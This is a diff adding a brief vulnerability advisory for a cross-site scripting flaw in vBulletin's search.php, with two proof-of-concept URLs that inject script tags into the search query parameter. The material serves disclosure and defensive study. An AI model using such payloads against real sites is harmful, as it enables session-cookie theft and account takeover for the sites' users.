@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/9656/info
+
+It has been reported that VBulletin is prone to a cross-site scripting vulnerability in the 'search.php' script. This issue is reportedly due to a failure to sanitize user input and so allow HTML and script code that may facilitate cross-site scripting attacks. Successful exploitation of this issue may allow for theft of cookie-based authentication credentials or other attacks.
+
+http://www.example.com/forum/search.php?do=process&showposts=0&query=<!-- / main error message --></p></p></blockquote>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>alert('XSS')</script><plaintext>
+
+http://www.example.com/forum/search.php?do=process&showposts=0&query=<script>alert('XSS')</script>
